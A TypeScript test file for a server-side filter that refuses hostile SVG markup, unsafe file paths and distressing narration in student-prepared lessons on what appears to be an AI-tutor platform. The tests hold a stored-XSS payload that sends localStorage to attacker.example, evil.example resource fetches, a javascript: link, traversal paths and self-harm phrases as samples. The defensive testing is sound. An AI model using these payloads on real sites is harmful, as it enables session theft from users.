import { describe, expect, it } from 'vitest';
import { checkSavedClass } from '../src/relays.ts';
import { isAllowedClassPath, unsafeMarkup } from '../src/markup.ts';

/**
 * THE ATTACK THAT WORKED, AND EVERY VARIANT OF IT.
 *
 * A prepared class is posted by a student's browser and then served to every
 * later student who opens that topic — and its diagram markup is inlined into
 * their page with `dangerouslySetInnerHTML`, in our origin, with their session
 * in the same document.
 *
 * The gate that refuses hostile markup existed. It ran in the browser, during
 * preparation, so it protected only the traffic that chose to walk through it.
 * Demonstrated against the live relay before this file existed: an anonymous
 * identity — free, by design — posted a class whose assets.json held
 * `<svg><g><script>fetch('https://…?s='+localStorage…)</script></g></svg>`,
 * and the endpoint answered 200 with the script served back intact.
 *
 * Every case below is that POST, in a different spelling.
 */

const svgWith = (inner: string) =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${inner}</svg>`;

const post = (over: Record<string, unknown> = {}, files?: unknown[]) => ({
  id: 'kidney-cross-section',
  entry: {
    id: 'kidney-cross-section',
    title: 'The Kidney',
    class: 10,
    subject: 'Science',
    path: 'kidney-cross-section/lesson.json',
    topicRef: 'class10-science/life-processes/excretion',
    ...over,
  },
  files: files ?? [
    { path: 'lesson.json', body: '{"id":"kidney-cross-section"}', encoding: 'utf8' },
    { path: 'assets.json', body: JSON.stringify({ d1: svgWith('<circle r="2"/>') }), encoding: 'utf8' },
  ],
});

const refused = (saved: unknown) => {
  const out = checkSavedClass(saved);
  return out.ok ? null : out.why;
};

describe('a class an ordinary student prepared', () => {
  it('is still kept', () => {
    expect(checkSavedClass(post()).ok).toBe(true);
  });

  it('keeps its pictures', () => {
    const withArt = post({}, [
      { path: 'lesson.json', body: '{}', encoding: 'utf8' },
      { path: 'assets.json', body: '{}', encoding: 'utf8' },
      { path: 'generated/d_kidney.png', body: 'AAAA', encoding: 'base64' },
    ]);
    expect(checkSavedClass(withArt).ok).toBe(true);
  });
});

describe('the markup that reached a live endpoint', () => {
  it('refuses the exact payload that got a 200', () => {
    const hostile = svgWith(
      '<g id="x"><script>fetch("https://attacker.example/?s="+localStorage.getItem("t"))</script></g>',
    );
    const why = refused(post({}, [
      { path: 'lesson.json', body: '{}', encoding: 'utf8' },
      { path: 'assets.json', body: JSON.stringify({ d1: hostile }), encoding: 'utf8' },
    ]));
    expect(why).toMatch(/assets\.json contains <script>/);
  });

  it('refuses a handler hidden behind a slash, not just a space', () => {
    // A tokenizer ends an attribute on whitespace OR a slash, so this is a
    // live handler that a whitespace-only check walks straight past.
    const hostile = svgWith('<circle r="2"/onload="alert(1)">');
    expect(refused(post({}, [
      { path: 'assets.json', body: JSON.stringify({ d1: hostile }), encoding: 'utf8' },
    ]))).toMatch(/event handler/);
  });

  it('refuses a stylesheet that can fetch', () => {
    for (const inner of ['<style>@import url(https://evil.example/x.css);</style>', '<style>a{}</style>']) {
      expect(refused(post({}, [
        { path: 'assets.json', body: JSON.stringify({ d1: svgWith(inner) }), encoding: 'utf8' },
      ]))).toBeTruthy();
    }
  });

  it('refuses anything that reaches off the page for a resource', () => {
    for (const inner of [
      '<image href="https://evil.example/x.png"/>',
      '<use href=https://evil.example/x.svg />',
      '<rect fill="url(https://evil.example/x)"/>',
      '<a href="javascript:alert(1)">x</a>',
    ]) {
      expect(refused(post({}, [
        { path: 'assets.json', body: JSON.stringify({ d1: svgWith(inner) }), encoding: 'utf8' },
      ]))).toBeTruthy();
    }
  });

  it('reads the WHOLE file, not just a field it expected', () => {
    // The body is JSON to us and a string to the gate. Hostile markup hidden
    // under an unexpected key is still hostile markup.
    const hostile = JSON.stringify({ anything: svgWith('<script>x</script>') });
    expect(refused(post({}, [{ path: 'assets.json', body: hostile, encoding: 'utf8' }]))).toBeTruthy();
  });

  it('checks lesson.json too, not only the assets', () => {
    expect(refused(post({}, [
      { path: 'lesson.json', body: '{"title":"<script>x</script>"}', encoding: 'utf8' },
    ]))).toMatch(/lesson\.json/);
  });
});

describe('which files a class may hold', () => {
  it('refuses an SVG file, which this bucket serves as image/svg+xml', () => {
    // A browser executes scripts inside one opened directly, and the app never
    // needs it: diagram markup travels inside assets.json.
    expect(refused(post({}, [{ path: 'd1.svg', body: '<svg/>', encoding: 'utf8' }]))).toBeTruthy();
  });

  it('refuses anything outside the three shapes saveable writes', () => {
    for (const path of ['index.html', 'x.js', 'generated/../../x', '.htaccess', 'generated/x.svg']) {
      expect(isAllowedClassPath(path)).toBe(false);
    }
  });

  it('still refuses a climb out of the folder', () => {
    for (const path of ['../other/lesson.json', '/etc/passwd', 'a\\b.json']) {
      expect(refused(post({}, [{ path, body: '{}', encoding: 'utf8' }]))).toBeTruthy();
    }
  });

  it('takes exactly what this app makes', () => {
    for (const path of ['lesson.json', 'assets.json', 'generated/d_graph.png', 'generated/d1.jpg']) {
      expect(isAllowedClassPath(path)).toBe(true);
    }
  });
});

describe('the catalogue row', () => {
  it('refuses an entry that names a different class', () => {
    // The row is written from saved.id and the files live under it. An entry
    // naming something else is either a bug or a row pointed at another
    // student's folder.
    expect(refused(post({ id: 'somebody-elses-class' }))).toMatch(/different class/);
  });
});

describe('the gate itself', () => {
  it('passes ordinary artwork', () => {
    expect(unsafeMarkup(svgWith('<g id="cortex"><path d="M1 1 L2 2" stroke="#333"/></g>'))).toEqual([]);
  });

  it('allows a reference INTO the same document, which is how gradients work', () => {
    expect(unsafeMarkup(svgWith('<rect fill="url(#grad)"/><use href="#part"/>'))).toEqual([
      'contains an embedding tag',
    ]);
  });
});

/**
 * AND THE SECOND THING A KEPT CLASS CARRIES TO EVERY LATER STUDENT: WORDS.
 *
 * The markup gate above moved to the server for one reason -- a class prepared
 * in a browser is POSTed here and then served to everyone, so a gate that ran
 * only during preparation protected only the traffic that chose to walk
 * through it. Every word of that argument applies to what she SAYS, and the
 * words had no gate at all.
 *
 * `ClassRoom.tsx` justified not screening narration on the way to the speaker
 * with "it came through prep, which screens what it plans". `packages/class-prep`
 * imports `@ai-tutor/safety` nowhere, and its own `safety.ts` is a re-export of
 * the MARKUP gate -- script tags and `@import`, not children. So the claim was
 * load-bearing and false, which is how a gap survives a review: somebody reads
 * the comment instead of the code.
 *
 * Narration is written by a model, kept permanently (`topic_ref` is unique and
 * a 409 is treated as success), and read aloud to every later student by a
 * tutor they trust. Refused, never cleaned: a class we do not fully understand
 * is one we do not keep, and preparing another costs Rs 30.
 */
describe('the words in a kept class', () => {
  const withLesson = (lesson: unknown) =>
    refused(
      post({}, [
        { path: 'lesson.json', body: JSON.stringify(lesson), encoding: 'utf8' },
        { path: 'assets.json', body: JSON.stringify({ d1: svgWith('<circle r="2"/>') }), encoding: 'utf8' },
      ]),
    );

  it('refuses a class whose narration reads as distress', () => {
    const why = withLesson({
      id: 'kidney-cross-section',
      beats: [{ id: 'b1', narration: 'Sometimes I want to kill myself when I think about it.' }],
    });

    expect(why).toMatch(/lesson\.json/);
  });

  it('refuses it wherever in the class it hides, not only in the first beat', () => {
    const why = withLesson({
      id: 'kidney-cross-section',
      beats: [
        { id: 'b1', narration: 'The kidney filters blood.' },
        { id: 'b2', narration: 'The nephron is the unit.' },
        { id: 'b3', narration: 'i want to kill myself' },
      ],
    });

    expect(why).not.toBeNull();
  });

  /**
   * THE COUNTER-TEST, WHICH MATTERS MORE THAN THE OTHERS.
   *
   * This is Class 10 Science. Blood, death, failure, attack and organs that
   * stop working are the SUBJECT. A gate that refuses a biology lesson for
   * saying "the heart stops" is not a safety feature, it is an outage that
   * only fires on the syllabus.
   */
  it('keeps an ordinary biology class that is full of blood and dying', () => {
    const why = withLesson({
      id: 'kidney-cross-section',
      beats: [
        { id: 'b1', narration: 'Agar kidney fail ho jaaye, toh blood mein waste jama hota hai.' },
        { id: 'b2', narration: 'A heart attack happens when blood cannot reach the heart muscle, and that tissue dies.' },
        { id: 'b3', narration: 'Red blood cells die after about 120 days and the spleen breaks them down.' },
      ],
    });

    expect(why).toBeNull();
  });

  it('still keeps the plain class the rest of this file posts', () => {
    expect(checkSavedClass(post()).ok).toBe(true);
  });
});
